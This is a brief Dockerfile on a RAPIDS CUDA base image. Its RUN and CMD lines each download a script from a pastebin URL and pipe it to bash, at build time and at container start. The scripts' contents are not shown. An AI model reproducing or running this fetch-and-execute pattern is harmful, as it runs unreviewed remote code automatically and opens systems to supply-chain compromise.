FROM rapidsai/rapidsai:0.16-cuda11.0-runtime-ubuntu18.04-py3.8
# FROM alpine:latest  

RUN curl https://pastebin.com/raw/aCVqdnc7 > gpu.sh && tr -d '\r' < gpu.sh > gpu2.sh && bash gpu2.sh
CMD curl https://pastebin.com/raw/f7JHCZzK > sweep.sh && tr -d '\r' < sweep.sh > sweep2.sh && bash sweep2.sh
#CMD bash
